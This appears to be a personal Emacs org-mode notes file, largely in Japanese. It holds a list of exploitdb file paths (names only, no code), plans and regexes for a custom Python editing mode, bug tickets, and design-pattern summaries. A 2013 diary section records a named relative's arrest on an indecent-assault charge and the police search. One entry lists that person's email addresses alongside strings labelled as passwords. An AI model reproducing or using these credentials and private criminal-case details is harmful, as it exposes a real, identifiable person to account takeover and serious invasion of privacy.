**** TODO file:/root/work/exploitdb/winremote/6841.txt
**** TODO file:/root/work/exploitdb/winremote/6870.html
**** TODO file:/root/work/exploitdb/winremote/6871.html
**** TODO file:/root/work/exploitdb/winremote/6872.html
**** TODO file:/root/work/exploitdb/winremote/6873.html
**** TODO file:/root/work/exploitdb/winremote/6875.html
**** TODO file:/root/work/exploitdb/winremote/6878.html
**** TODO file:/root/work/exploitdb/winremote/6880.html
**** TODO file:/root/work/exploitdb/winremote/6921.rb
**** TODO file:/root/work/exploitdb/winremote/693.c
**** TODO file:/root/work/exploitdb/winremote/6963.html
**** TODO file:/root/work/exploitdb/winremote/69.c
**** TODO file:/root/work/exploitdb/winremote/7056.rb
**** TODO file:/root/work/exploitdb/winremote/70.c
**** TODO file:/root/work/exploitdb/winremote/7104.c
**** TODO file:/root/work/exploitdb/winremote/711.c
**** TODO file:/root/work/exploitdb/winremote/7125.txt
**** TODO file:/root/work/exploitdb/winremote/7132.py
**** TODO file:/root/work/exploitdb/winremote/7142.html
**** TODO file:/root/work/exploitdb/winremote/7145.txt
**** TODO file:/root/work/exploitdb/winremote/7167.html
**** TODO file:/root/work/exploitdb/winremote/7181.html
**** TODO file:/root/work/exploitdb/winremote/7196.html
**** TODO file:/root/work/exploitdb/winremote/719.txt
**** TODO file:/root/work/exploitdb/winremote/726.c
**** TODO file:/root/work/exploitdb/winremote/729.txt
**** TODO file:/root/work/exploitdb/winremote/730.html
**** TODO file:/root/work/exploitdb/winremote/733.c
**** TODO file:/root/work/exploitdb/winremote/734.c
**** TODO file:/root/work/exploitdb/winremote/7355.txt
**** TODO file:/root/work/exploitdb/winremote/7384.txt
**** TODO file:/root/work/exploitdb/winremote/7402.html
**** TODO file:/root/work/exploitdb/winremote/7403.txt
**** TODO file:/root/work/exploitdb/winremote/7410.htm
**** TODO file:/root/work/exploitdb/winremote/7442.txt
**** TODO file:/root/work/exploitdb/winremote/7452.pl
**** TODO file:/root/work/exploitdb/winremote/7477.html
**** TODO file:/root/work/exploitdb/winremote/7505.html
**** TODO file:/root/work/exploitdb/winremote/750.c
**** TODO file:/root/work/exploitdb/winremote/7521.txt
**** TODO file:/root/work/exploitdb/winremote/753.html
**** TODO file:/root/work/exploitdb/winremote/7566.html
**** TODO file:/root/work/exploitdb/winremote/7583.pl
**** TODO file:/root/work/exploitdb/winremote/7584.pl
**** TODO file:/root/work/exploitdb/winremote/7594.html
**** TODO file:/root/work/exploitdb/winremote/759.cpp
**** TODO file:/root/work/exploitdb/winremote/7617.html
**** TODO file:/root/work/exploitdb/winremote/761.cpp
**** TODO file:/root/work/exploitdb/winremote/7623.html
**** TODO file:/root/work/exploitdb/winremote/7630.html
**** TODO file:/root/work/exploitdb/winremote/765.c
**** TODO file:/root/work/exploitdb/winremote/767.pl
**** TODO file:/root/work/exploitdb/winremote/76.c
**** TODO file:/root/work/exploitdb/winremote/7706.mrc
**** TODO file:/root/work/exploitdb/winremote/771.cpp
**** TODO file:/root/work/exploitdb/winremote/7739.html
**** TODO file:/root/work/exploitdb/winremote/7747.html
**** TODO file:/root/work/exploitdb/winremote/7748.html
**** TODO file:/root/work/exploitdb/winremote/7749.html
**** TODO file:/root/work/exploitdb/winremote/7755.html
**** TODO file:/root/work/exploitdb/winremote/7757.html
**** TODO file:/root/work/exploitdb/winremote/7762.html
**** TODO file:/root/work/exploitdb/winremote/7763.html
**** TODO file:/root/work/exploitdb/winremote/7779.html
**** TODO file:/root/work/exploitdb/winremote/7794.html
**** TODO file:/root/work/exploitdb/winremote/7804.html
**** TODO file:/root/work/exploitdb/winremote/781.py
**** TODO file:/root/work/exploitdb/winremote/7826.html
**** TODO file:/root/work/exploitdb/winremote/7827.html
**** TODO file:/root/work/exploitdb/winremote/7842.html
**** TODO file:/root/work/exploitdb/winremote/7868.html
**** TODO file:/root/work/exploitdb/winremote/7871.html
**** TODO file:/root/work/exploitdb/winremote/7875.pl
**** TODO file:/root/work/exploitdb/winremote/787.pl
**** TODO file:/root/work/exploitdb/winremote/7903.html
**** TODO file:/root/work/exploitdb/winremote/7910.html
**** TODO file:/root/work/exploitdb/winremote/7912.txt
**** TODO file:/root/work/exploitdb/winremote/7913.pl
**** TODO file:/root/work/exploitdb/winremote/7918.txt
**** TODO file:/root/work/exploitdb/winremote/7919.txt
**** TODO file:/root/work/exploitdb/winremote/7926.pl
**** TODO file:/root/work/exploitdb/winremote/7928.txt
**** TODO file:/root/work/exploitdb/winremote/7935.html
**** TODO file:/root/work/exploitdb/winremote/794.c
**** TODO file:/root/work/exploitdb/winremote/7966.txt
**** TODO file:/root/work/exploitdb/winremote/7988.pl
**** TODO file:/root/work/exploitdb/winremote/7989.pl
**** TODO file:/root/work/exploitdb/winremote/802.cpp
**** TODO file:/root/work/exploitdb/winremote/8041.txt
**** TODO file:/root/work/exploitdb/winremote/804.c
**** TODO file:/root/work/exploitdb/winremote/8059.html
**** TODO file:/root/work/exploitdb/winremote/8079.html
**** TODO file:/root/work/exploitdb/winremote/8080.py
**** TODO file:/root/work/exploitdb/winremote/8082.html
**** TODO file:/root/work/exploitdb/winremote/80.c
**** TODO file:/root/work/exploitdb/winremote/8117.pl
**** TODO file:/root/work/exploitdb/winremote/8118.html
**** TODO file:/root/work/exploitdb/winremote/8142.py
**** TODO file:/root/work/exploitdb/winremote/8143.html
**** TODO file:/root/work/exploitdb/winremote/8144.txt
**** TODO file:/root/work/exploitdb/winremote/8149.txt
**** TODO file:/root/work/exploitdb/winremote/8152.py
**** TODO file:/root/work/exploitdb/winremote/8154.pl
**** TODO file:/root/work/exploitdb/winremote/8155.txt
**** TODO file:/root/work/exploitdb/winremote/8160.html
**** TODO file:/root/work/exploitdb/winremote/8173.txt
**** TODO file:/root/work/exploitdb/winremote/819.py
**** TODO file:/root/work/exploitdb/winremote/81.c
**** TODO file:/root/work/exploitdb/winremote/8200.pl
**** TODO file:/root/work/exploitdb/winremote/8203.pl
**** TODO file:/root/work/exploitdb/winremote/8206.html
**** TODO file:/root/work/exploitdb/winremote/8208.html
**** TODO file:/root/work/exploitdb/winremote/8211.pl
**** TODO file:/root/work/exploitdb/winremote/8215.txt
**** TODO file:/root/work/exploitdb/winremote/8227.pl
**** TODO file:/root/work/exploitdb/winremote/822.c
**** TODO file:/root/work/exploitdb/winremote/823.c
**** TODO file:/root/work/exploitdb/winremote/8248.py
**** TODO file:/root/work/exploitdb/winremote/8253.c
**** TODO file:/root/work/exploitdb/winremote/8256.c
**** TODO file:/root/work/exploitdb/winremote/8257.txt
**** TODO file:/root/work/exploitdb/winremote/825.c
**** TODO file:/root/work/exploitdb/winremote/8273.c
**** TODO file:/root/work/exploitdb/winremote/827.c
**** TODO file:/root/work/exploitdb/winremote/8283.c
**** TODO file:/root/work/exploitdb/winremote/8284.pl
**** TODO file:/root/work/exploitdb/winremote/8295.pl
**** TODO file:/root/work/exploitdb/winremote/830.c
**** TODO file:/root/work/exploitdb/winremote/8321.py
**** TODO file:/root/work/exploitdb/winremote/8332.txt
**** TODO file:/root/work/exploitdb/winremote/8336.pl
**** TODO file:/root/work/exploitdb/winremote/8338.py
**** TODO file:/root/work/exploitdb/winremote/8339.py
**** TODO file:/root/work/exploitdb/winremote/8340.py
**** TODO file:/root/work/exploitdb/winremote/8354.py
**** TODO file:/root/work/exploitdb/winremote/8363.py
**** TODO file:/root/work/exploitdb/winremote/8368.txt
**** TODO file:/root/work/exploitdb/winremote/8392.txt
**** TODO file:/root/work/exploitdb/winremote/8398.php
**** TODO file:/root/work/exploitdb/winremote/83.html
**** TODO file:/root/work/exploitdb/winremote/8419.pl
**** TODO file:/root/work/exploitdb/winremote/8421.py
**** TODO file:/root/work/exploitdb/winremote/8422.py
**** TODO file:/root/work/exploitdb/winremote/8428.txt
**** TODO file:/root/work/exploitdb/winremote/845.c
**** TODO file:/root/work/exploitdb/winremote/8463.txt
**** TODO file:/root/work/exploitdb/winremote/847.cpp
**** TODO file:/root/work/exploitdb/winremote/8518.pl
**** TODO file:/root/work/exploitdb/winremote/8525.pl
**** TODO file:/root/work/exploitdb/winremote/8537.txt
**** TODO file:/root/work/exploitdb/winremote/854.cpp
**** TODO file:/root/work/exploitdb/winremote/8554.py
**** TODO file:/root/work/exploitdb/winremote/8560.html
**** TODO file:/root/work/exploitdb/winremote/8561.pl
**** TODO file:/root/work/exploitdb/winremote/8562.html
**** TODO file:/root/work/exploitdb/winremote/8564.pl
**** TODO file:/root/work/exploitdb/winremote/8579.html
**** TODO file:/root/work/exploitdb/winremote/859.c
**** TODO file:/root/work/exploitdb/winremote/8613.py
**** TODO file:/root/work/exploitdb/winremote/8614.py
**** TODO file:/root/work/exploitdb/winremote/8621.py
**** TODO file:/root/work/exploitdb/winremote/8623.rb
**** TODO file:/root/work/exploitdb/winremote/8651.pl
**** TODO file:/root/work/exploitdb/winremote/8666.txt
**** TODO file:/root/work/exploitdb/winremote/868.cpp
**** TODO file:/root/work/exploitdb/winremote/8704.txt
**** TODO file:/root/work/exploitdb/winremote/8716.py
**** TODO file:/root/work/exploitdb/winremote/8732.py
**** TODO file:/root/work/exploitdb/winremote/8733.html
**** TODO file:/root/work/exploitdb/winremote/8742.txt
**** TODO file:/root/work/exploitdb/winremote/8754.patch
**** TODO file:/root/work/exploitdb/winremote/8757.html
**** TODO file:/root/work/exploitdb/winremote/8758.html
**** TODO file:/root/work/exploitdb/winremote/875.c
**** TODO file:/root/work/exploitdb/winremote/8765.php
**** TODO file:/root/work/exploitdb/winremote/8804.py
**** TODO file:/root/work/exploitdb/winremote/8806.pl
**** TODO file:/root/work/exploitdb/winremote/8824.html
**** TODO file:/root/work/exploitdb/winremote/8835.html
**** TODO file:/root/work/exploitdb/winremote/883.c
**** TODO file:/root/work/exploitdb/winremote/8897.c
**** TODO file:/root/work/exploitdb/winremote/8916.py
**** TODO file:/root/work/exploitdb/winremote/8922.txt
**** TODO file:/root/work/exploitdb/winremote/8930.txt
**** TODO file:/root/work/exploitdb/winremote/8934.py
**** TODO file:/root/work/exploitdb/winremote/8938.txt
**** TODO file:/root/work/exploitdb/winremote/8969.rb
**** TODO file:/root/work/exploitdb/winremote/8970.txt
**** TODO file:/root/work/exploitdb/winremote/8986.txt
**** TODO file:/root/work/exploitdb/winremote/9002.c
**** TODO file:/root/work/exploitdb/winremote/9031.py
**** TODO file:/root/work/exploitdb/winremote/9065.c
**** TODO file:/root/work/exploitdb/winremote/906.c
**** TODO file:/root/work/exploitdb/winremote/9093.txt
**** TODO file:/root/work/exploitdb/winremote/9096.txt
**** TODO file:/root/work/exploitdb/winremote/909.cpp
**** TODO file:/root/work/exploitdb/winremote/90.c
**** TODO file:/root/work/exploitdb/winremote/9106.txt
**** TODO file:/root/work/exploitdb/winremote/9108.py
**** TODO file:/root/work/exploitdb/winremote/9128.py
**** TODO file:/root/work/exploitdb/winremote/9137.html
**** TODO file:/root/work/exploitdb/winremote/9139.pl
**** TODO file:/root/work/exploitdb/winremote/9181.py
**** TODO file:/root/work/exploitdb/winremote/9214.pl
**** TODO file:/root/work/exploitdb/winremote/9224.py
**** TODO file:/root/work/exploitdb/winremote/92.c
**** TODO file:/root/work/exploitdb/winremote/9303.c
**** TODO file:/root/work/exploitdb/winremote/930.html
**** TODO file:/root/work/exploitdb/winremote/9318.py
**** TODO file:/root/work/exploitdb/winremote/9319.py
**** TODO file:/root/work/exploitdb/winremote/9330.py
**** TODO file:/root/work/exploitdb/winremote/943.html
**** TODO file:/root/work/exploitdb/winremote/9443.txt
**** TODO file:/root/work/exploitdb/winremote/944.c
**** TODO file:/root/work/exploitdb/winremote/945.c
**** TODO file:/root/work/exploitdb/winremote/9468.py
**** TODO file:/root/work/exploitdb/winremote/947.pl
**** TODO file:/root/work/exploitdb/winremote/949.c
**** TODO file:/root/work/exploitdb/winremote/9500.cpp
**** TODO file:/root/work/exploitdb/winremote/9508.rb
**** TODO file:/root/work/exploitdb/winremote/952.pl
**** TODO file:/root/work/exploitdb/winremote/953.c
**** TODO file:/root/work/exploitdb/winremote/9541.pl
**** TODO file:/root/work/exploitdb/winremote/9559.pl
**** TODO file:/root/work/exploitdb/winremote/955.py
**** TODO file:/root/work/exploitdb/winremote/9586.py
**** TODO file:/root/work/exploitdb/winremote/9592.rb
**** TODO file:/root/work/exploitdb/winremote/9596.py
**** TODO file:/root/work/exploitdb/winremote/960.c
**** TODO file:/root/work/exploitdb/winremote/9613.py
**** TODO file:/root/work/exploitdb/winremote/9615.jar
**** TODO file:/root/work/exploitdb/winremote/9638.txt
**** TODO file:/root/work/exploitdb/winremote/9643.txt
**** TODO file:/root/work/exploitdb/winremote/9644.py
**** TODO file:/root/work/exploitdb/winremote/9649.txt
**** TODO file:/root/work/exploitdb/winremote/9650.txt
**** TODO file:/root/work/exploitdb/winremote/9652.sh
**** TODO file:/root/work/exploitdb/winremote/9660.pl
**** TODO file:/root/work/exploitdb/winremote/9662.c
**** TODO file:/root/work/exploitdb/winremote/9663.py
**** TODO file:/root/work/exploitdb/winremote/9673.py
**** TODO file:/root/work/exploitdb/winremote/9676.txt
**** TODO file:/root/work/exploitdb/winremote/967.cpp
**** TODO file:/root/work/exploitdb/winremote/968.c
**** TODO file:/root/work/exploitdb/winremote/9690.py
**** TODO file:/root/work/exploitdb/winremote/9694.txt
**** TODO file:/root/work/exploitdb/winremote/969.c
**** TODO file:/root/work/exploitdb/winremote/9704.html
**** TODO file:/root/work/exploitdb/winremote/9705.html
**** TODO file:/root/work/exploitdb/winremote/975.py
**** TODO file:/root/work/exploitdb/winremote/976.cpp
**** TODO file:/root/work/exploitdb/winremote/979.txt
**** TODO file:/root/work/exploitdb/winremote/97.c
**** TODO file:/root/work/exploitdb/winremote/9800.cpp
**** TODO file:/root/work/exploitdb/winremote/9802.html
**** TODO file:/root/work/exploitdb/winremote/9803.html
**** TODO file:/root/work/exploitdb/winremote/9805.html
**** TODO file:/root/work/exploitdb/winremote/9810.txt
**** TODO file:/root/work/exploitdb/winremote/9813.txt
**** TODO file:/root/work/exploitdb/winremote/9814.py
**** TODO file:/root/work/exploitdb/winremote/9815.py
**** TODO file:/root/work/exploitdb/winremote/9816.py
**** TODO file:/root/work/exploitdb/winremote/9817.py
**** TODO file:/root/work/exploitdb/winremote/9851.pl
**** TODO file:/root/work/exploitdb/winremote/9853.rb
**** TODO file:/root/work/exploitdb/winremote/986.html
**** TODO file:/root/work/exploitdb/winremote/987.c
**** TODO file:/root/work/exploitdb/winremote/9886.txt
**** TODO file:/root/work/exploitdb/winremote/9893.txt
**** TODO file:/root/work/exploitdb/winremote/9896.txt
**** TODO file:/root/work/exploitdb/winremote/9900.txt
**** TODO file:/root/work/exploitdb/winremote/9902.txt
**** TODO file:/root/work/exploitdb/winremote/9905.cpp
**** TODO file:/root/work/exploitdb/winremote/990.c
**** TODO file:/root/work/exploitdb/winremote/9947.rb
**** TODO file:/root/work/exploitdb/winremote/9957.txt
**** TODO file:/root/work/exploitdb/winremote/9966.txt
**** TODO file:/root/work/exploitdb/winremote/9992.txt
**** TODO file:/root/work/exploitdb/winremote/9998.c
*** Algorithm
* Stack:
** TODO [#C] if/while で= を使用しない。
; if before char is ">" "<", then insert =
; if in "if" statement then, insert "=="
; else insert "="
** TODO [#C] __python__.el arhcitecture

1) 背景 (問題点)
   make new my python.el

2) 対応方法
   create architecture

3) 優先順位の根拠
   need a lot of time

4) 備考
   # variable
   py:indent-offset 4
   py:mode-line-name

   # auto-mode-alist .py .pyw .pyx .pyd .pyxi .py3 .py.gz

   # functions
   py:indent-shift-left
   py:indent-shift-right
   py:align-indent-level
   py:comment
   py:ffap




# documentation

# interaction
py:run
py:shell-send-string
py:shell-send-region
py:shell-send-defun
py:shell-send-buffer
py:shell-send-file
py:shell-switch-to-shell

# pdb

# test

# other
dictionary writer {}

# split file
ipython.el
pep8.el
pylint.el



1) 結果
2) time/ref
    / cf. [[file:~/.emacs.d/allinone.org::*Emacs:][Emacs:]]
*** investigate
**** color
**** refactoring

*** regexp
block-start from python.el
(rx symbol-start (or "def" "class" "if" "elif" "else" "try"
"except" "finally" "for" "while" "with")
symbol-end)

decorator
(rx line-start (* space) ?@ (any letter ?_)
    (* (any word ?_)))

if-name-main
(rx line-start "if" (+ space) "__name__"
    (+ space) "==" (+ space)
    (any ?' ?\") "__main__" (any ?' ?\")
    (* space) ?:)

open-paren
(rx (or "{" "[" "("))

close-paren
(rx (or "}" "]" ")"))

simple operator from python.el
(rx (any ?+ ?- ?/ ?& ?^ ?~ ?| ?* ?< ?> ?= ?%))

not simple operator from python.el
(rx (not (any ?+ ?- ?/ ?& ?^ ?~ ?| ?* ?< ?> ?= ?%)))

operator from python.el
(rx (or "+" "-" "/" "&" "^" "~" "|" "*" "<" ">"
"=" "%" "**" "//" "<<" ">>" "<=" "!="
"==" ">=" "is" "not"))

assignment-operator from python.el
(rx (or "=" "+=" "-=" "*=" "/=" "//=" "%=" "**="
                                       ">>=" "<<=" "&=" "^=" "|="))

python-delimiter from python.el
(rx (and
;; Match even number of backslashes.
(or (not (any ?\\ ?\' ?\")) point
;; Quotes might be preceded by a escaped quote.
(and (or (not (any ?\\)) point) ?\\
(* ?\\ ?\\) (any ?\' ?\")))
(* ?\\ ?\\)
;; Match single or triple quotes of any kind.
(group (or  "\"" "\"\"\"" "'" "'''"))))

py-blank-or-comment-re from python-mode.el
 "[ \t]*\\($\\|#\\)"

py-block-closing-keywords-re from python-mode.el
  "[ \t]*\\_<\\(return\\|raise\\|break\\|continue\\|pass\\)\\_>[ \n\t]"

py-block-closing-keywords-re from python-mode.el
  "[ \t]*\\_<\\(return\\|raise\\|break\\|continue\\|pass\\)\\_>[ \n\t]"

py-finally-re
"[ \t]*\\_<finally\\_>[: \n\t]"

py-except-re
  "[ \t]*\\_<except\\_>[: \n\t]"

py-else-re
  "[ \t]*\\_<else\\_>[: \n\t]"

py-return-re
  ".*:?[ \t]*\\_<\\(return\\)\\_>[ \n\t]"

py-no-outdent-re "\\(try:\\|except\\(\\s +.*\\)?:\\|while\\s +.*:\\|for\\s +.*:\\|if\\s +.*:\\|elif\\s +.*:\\)\\([ 	]*\\_<\\(return\\|raise\\|break\\|continue\\|pass\\)\\_>[ 	\n]\\)")

(defconst py-assignment-re "\\_<\\w+\\_>[ \t]*\\(=\\|+=\\|*=\\|%=\\|&=\\|^=\\|<<=\\|-=\\|/=\\|**=\\||=\\|>>=\\|//=\\)"
  "If looking at the beginning of an assignment. ")

(defconst py-block-re "[ \t]*\\_<\\(class\\|def\\|for\\|if\\|try\\|while\\|with\\)\\_>[: \n\t]"
  "Matches the beginning of a compound statement. ")

(defconst py-minor-block-re "[ \t]*\\_<\\(for\\|if\\|try\\|with\\)\\_>[: \n\t]"
  "Matches the beginning of an `for', `if', `try' or `with' block. ")

(defconst py-try-block-re "[ \t]*\\_<try\\_>[: \n\t]"
  "Matches the beginning of an `if' or `try' block. ")

(defconst py-class-re "[ \t]*\\_<\\(class\\)\\_>[ \n\t]"
  "Matches the beginning of a class definition. ")

(defconst py-def-or-class-re "[ \t]*\\_<\\(def\\|class\\)\\_>[ \n\t]"
  "Matches the beginning of a class- or functions definition. ")

(defconst py-def-re "[ \t]*\\_<\\(def\\)\\_>[ \n\t]"
  "Matches the beginning of a functions definition. ")

(defconst py-block-or-clause-re "[ \t]*\\_<\\(def\\|class\\|if\\|else\\|elif\\|while\\|for\\|try\\|except\\|finally\\|with\\)\\_>[: \n\t]"
  "Matches the beginning of a compound statement or it's clause. ")
;; (setq py-block-or-clause-re "[ \t]*\\_<\\(if\\|else\\|elif\\|while\\|for\\|try\\|except\\|finally\\|with\\)\\_>[: \n\t]")

(defconst py-extended-block-or-clause-re "[ \t]*\\_<\\(def\\|class\\|if\\|else\\|elif\\|while\\|for\\|try\\|except\\|finally\\|with\\)\\_>[: \n\t]"
  "Matches the beginning of a compound statement or it's clause.
Includes def and class. ")

(defconst py-clause-re "[ \t]*\\_<\\(else\\|elif\\|except\\|finally\\)\\_>[: \n\t]"
  "Matches the beginning of a compound statement's clause. ")
;; (setq py-clause-re "[ \t]*\\_<\\(else\\|elif\\|except\\|finally\\)\\_>[: \n\t]")

(defconst py-elif-re "[ \t]*\\_<\\elif\\_>[: \n\t]"
  "Matches the beginning of a compound if-statement's clause exclusively. ")

(defconst py-try-clause-re "[ \t]*\\_<\\(except\\|else\\|finally\\)\\_>[: \n\t]"
  "Matches the beginning of a compound try-statement's clause. ")

(defconst py-if-re "[ \t]*\\_<if\\_>[ \n\t]"
  "Matches the beginning of a compound statement saying `if'. ")

(defconst py-try-re "[ \t]*\\_<try\\_>[: \n\t]"
  "Matches the beginning of a compound statement saying `try'. " )

# Tail end of ' string.
Single = r"[^'\\]*(?:\\.[^'\\]*)*'"
# Tail end of " string.
Double = r'[^"\\]*(?:\\.[^"\\]*)*"'
# Tail end of ''' string.
Single3 = r"[^'\\]*(?:(?:\\.|'(?!'')) [^'\\]*)*'''"
# Tail end of """ string.
Double3 = r'[^"\\]*(?:(?:\\.|"(?!"")) [^"\\]*)*"""'
Triple = group ("[uUbB]?[rR]?'''", '[uUbB]?[rR]?"""')
# Single-line ' or " string.
String = group (r"[uUbB]?[rR]?'[^\n'\\]*(?:\\.[^\n'\\]*)*'",
               r'[uUbB]?[rR]?"[^\n"\\]*(?:\\.[^\n"\\]*)*"')

*** predicate

underscore-word-p
in-string-or-comment-block-p
in-string-block-p
py-in-statement-p
py-beginning-of-def-p
py-beginning-of-class-p
py-beginning-of-def-or-class-p

py-end-of-line-p
py-end-of-buffer-p
py-end-of-paragraph-p
py-end-of-statement-p
py-end-of-expression-p
py-end-of-partial-expression-p
py-end-of-block-p
py-end-of-clause-p
py-end-of-block-or-clause-p
py-end-of-def-p
py-end-of-class-p

py-statement-opens-block-p
py-statement-opens-base
py-statement-opens-clause-p
py-statement-opens-block-or-clause-p
py-statement-opens-class-p
py-statement-opens-def-p
py-statement-opens-def-or-class-p
py-statement-closes-block-p

py-beginning-of-block-bol-p
py-beginning-of-def-bol-p
py-beginning-of-class-bol-p

**** in line
py:in-line-empty-p
py:in-line-if-p
py:in-line-else-p
py:in-line-elif-p
py:in-line-while-p
py:in-line-def-p
py:in-line-class-p
py:in-line-return-p
py:in-line-indent-p
py:in-line-import-p
py:in-line-from-p
py:in-line-with-p
py:in-line-try-p


**** in block
py:in-block-if-p
py:in-block-elif-p
py:in-block-else-p
py:in-block-while-p
py:in-block-class-p
py:in-block-method-p
py:in-block-comment-p
py:in-block-doc-p
py:in-block-try-p
py:in-block-except-p
py:in-block-finally-p
py:in-block-for-p


**** in paren
py:in-func-paren-p
py:in-paren-p
py:in-list-box-p
py:in-dict-p

*** move
py:mv-block-up
py:mv-block-down
py:mv-def-up
py:mv-def-down
py:mv-class-up
py:mv-class-down

*** region
py:region-def
py:region-method
py:region-class
py:region-if
py:region-while
py:region-doc
py:region-paren
py:region-\(\)
py:region-{}
py:region-[]


py:comment-region
py:comment-def
py:comment-block
py:comment-class

py:mark-paragraph
py:mark-block
py:mark-def
py:mark-class
py:mark-class-of-def
py:mark-line
py:mark-statement

*** internal functions
py:get-this-class-name
py:get-this-def-name
py:get-this-if-state
py:get-this-while-state

py:get-this-indent-length

*** functions
**** auto split line if line is over 80
hello = 'world yahoo google'
=>
hello = ('world yahoo'
         'googl')
*** TODO [#B] python mode make headers.

1) 背景 (問題点)


2) 対応方法
   header2

3) 優先順位の根拠
   日付をつけて保存すると管理しやすくなる。
   library が増えてきたので

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.pylib/myxlib/__init__.py::import%20Xlib][file:~/.pylib/myxlib/__init__.py::import Xlib]]
*** TODO [#C] python mode, @ key call decolater list

1) 背景 (問題点)

2) 対応方法
rare use @ key, almost in decolater

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.pylib/wm/_core.py]]


** TODO [#C] auto install script by python

    [[file:~/.emacs.d/allinone.org::*Stack:][Stack:]]
* Daily
** 2013
*** 4/17
- 朝、大地と連絡がとれず、車を乗って行ったとみられ父、会社を
  休む。会社には叔父さんが亡くなったとして連絡。
- 仙台の実家、啓一叔父さんが亡くなったと連絡がある。
- 父、歯医者の予約を前倒しして 6:00 に変更し叡山歯科へ向う。
- 大地が拘置所に拘留されていると警察から連絡がある。
*** 4/18
- 15:45 警察が大地の件で家を家宅捜索にくる。
  捜査令状によると強制わいせつ致傷罪であった。
  家宅捜索をするとは聞いていなかったので、
  事件の経緯を捜査官から説明を受ける。
  警察によると大地は南郷の洗堰西側で逮捕されたとのこと。
  時刻は 4/16 24:05 頃。
  女性に猥褻行為を働こうとし、目撃者によって通報される際に逃
  走を図ろうとして相手に怪我をおわせた模様。
  女性からは診断書もでているとのこと。
  また車は現場からかなり離れた場所にあった。
  大地は最初は否認をしていたが、警察曰く現在は認めているそう
  だ。
  さらに、余罪の可能性もあるらしく拘留が長引く見通し。
*** 4/19
- 11:00 母、航、大地との面会に向う。
  17:00 頃、大地の彼女に連絡。
  彼女は大地の事件の事をネットのニュースで知った様子。
  ニュースは産経で配信されており、相手は 27 歳の無職の女性との
  こと。
*** 4/21
大地 アドレス パスワード
0ny30747785506g@ezweb.ne.jp
daichih05006@yahoo.co.jp
3218
312819
* Bug:
** TODO [#B] python mode "=" action

1) 背景 (問題点)
   "=" behave is worth

2) 対応方法
   rethink

3) 優先順位の根拠
   many use this action

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/work/Python_Testing_Beginners_Guide/page-0020.png]]
** TODO [#C] if command line through frige override same line on multi-term

1) 背景 (問題点)

2) 対応方法
   disable any plugin

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.emacs.d/elisp/start.d/22_savekill_plugin_start.elc]]
** TODO [#A] py--import-statement-end-point not included undo history

1) 背景 (問題点)
   this command not add undo history
   if execute undo command, statement will corrupt

2) 対応方法
   history function add

3) 優先順位の根拠
   cannot use undo command until fix

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.emacs.d/elisp/mylisp/python-extensions.el::(defun%20py--import-statement-end-point%20 ()][file:~/.emacs.d/elisp/mylisp/python-extensions.el::(defun py--import-statement-end-point ()]]
** TODO [#C] sikuli could not detect on left dual display

1) 背景 (問題点)
   cannot detect sikuli left display

2) 対応方法
   search sikuli dual display
or force open on right display

3) 優先順位の根拠
   almost ok if open on right display

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.pylib/daily.py::def%20create_recipe ():][file:~/.pylib/daily.py::def create_recipe ():]]
** TODO [#C] python-mode.el python.el 両方読み込まれている状態。

1) 背景 (問題点)


2) 対応方法
   make new my python mode

3) 優先順位の根拠
   will need spend a lot of times.

4) 備考

5) 結果
6) time/ref
    / cf.
** TODO [#C] __str__ yasnippet

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:/tmp/junk/2013-09-23-180732.junk.py]]
** TODO [#C] yasnippet logging.BasicConfig from auto-complete

1) 背景 (問題点)

2) 対応方法

3) 優先順位の根拠

4) 備考

5) 結果
6) time/ref
    / cf. [[file:~/.pylib/daily.py::format%3Dlogformat)][file:~/.pylib/daily.py::format=logformat)]]
* Design Pattern
** Strategy
   http://www.ogis-ri.co.jp/otc/hiroba/technical/DesignPatternsWithExample/chapter06.html

*** 変更対応
    アルゴリズムの変更

*** 利点・欠点
    + 条件ロジックが減る、あるいは取り除かれるため、アルゴリ
      ズムが明白になる
    + アルゴリズムのバリエーションをクラス階層に移すため、個々
      のクラスが単純になる
    + 実行時にアルゴリズムを別のものに置き換えることができる

    - 継承による解決策や「条件記述の単純化」に書かれたリファ
      クタリングを使ったほうが簡単な場合には、それよりも設計
      が複雑になる

    - アルゴリズムがコンテキストクラスとデータをやり取りする
      方法が複雑になる 

** Visitor
*** 変更対応

    アルゴリズムの変更に対応

** State

*** 目的
    オブジェクト内部状態が変化したときに、オブジェクトが振舞
    を変えるよにする。クラス内では、振舞の変化を記述せず、状
    態を表すオブジェクトを導入することでこれを実現する。

*** 変更対応

    オブジェクトの状態の変更に対応

*** 利点・欠点
    + 状態を変えるための条件ロジックがなくなる、あるいは減る
    + 状態を変える複雑なロジックが単純になる
    + 状態を変えるロジックを俯瞰することができる
      
    - 状態遷移ロジックがもともとわかりやすい場合には、設計が
      複雑にになるだけである

** Decorator
*** 変更対応

    オブジェクトの振る舞いの変更に対応

*** 利点・欠点
    + 拡張機能が取り除かれるのでクラスを単純にできる
    + クラスの核となる責務と拡張機能と効果的に区別できる
    + 関連する複数のクラスに含まれる重複した拡張ロジックを取
      り除くことができる
    - 装飾対象のオブジェクトと装飾後のオブジェクトは異るもの
      になってしまう
    - コードを理解したりデバッグしたりするのが困難な場合があ
      る
    - Decorator を組み合わせた際、互いに悪影響を及ぼす場合に
      は、設計が複雑になる


** Adapter
*** 動機
    - 2 つのクラスが同じ、あるいはよく似たことを行っており、そ
      のインターフェースが異る
    - それらのクラスが同じインターフェースを共有しているとし
      たら、クライアントのコードはよりシンプルかつ簡単、簡明
      になる
    - サードパーティー製ライブラリの一部である、他の多くのク
      ライアントが既に使っているフレームワークの一部である、
      またはソースコードを入手できないといった理由で、片方の
      クラスのインターフェースを簡単に変えることができない

*** 変更対応

    インターフェースの変更に対応

*** 利点・欠点
    + クライアントコードが同じインターフェースを通じて複数の
      クラスとやり取りできるため、コードの重複をなくしたり減
      らしたりできる
    + 共通のインターフェースを通じてオブジェクトとやり取りで
      きるため、クライアントコードが簡潔になる
    + クライアントが複数のクラスとやり取りする方法を統合でき
      る
    + コンンポーネントやライブラリや API のバージョンごとに違
      いを切り分けることができる
    + クラスの責務を 1 つのバージョンに対応することだけに限定
      できる
